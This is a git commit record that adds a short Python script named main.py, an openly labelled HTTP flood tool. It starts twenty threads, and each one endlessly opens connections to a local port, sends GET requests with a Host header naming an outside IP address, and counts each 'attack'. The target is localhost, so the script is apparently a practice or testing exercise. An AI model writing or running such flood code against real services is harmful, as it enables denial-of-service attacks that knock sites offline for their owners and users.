9277ffa5a0a7eeb2c739c42b1c55ec658ce19cbc
Murad Mammadzade <mammadzade03@gmail.com>
2023-10-08 10:12:35 +0400

    Done

---
+++ main.py
@@ -0,0 +1,16 @@
+import socket
+import threading
+attack_num=0
+def attack():
+    while True:
+        s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
+        s.connect(('127.0.0.1', 8000))
+        s.send(b'GET / HTTP/1.1\r\nHost:188.42.48.81\r\n\r\n')
+        resp=s.recv(4096)
+        global attack_num
+        attack_num+=1
+        print("Attack number",attack_num)
+        s.close()
+for i in range(20):
+    thread=threading.Thread(target=attack)
+    thread.start()
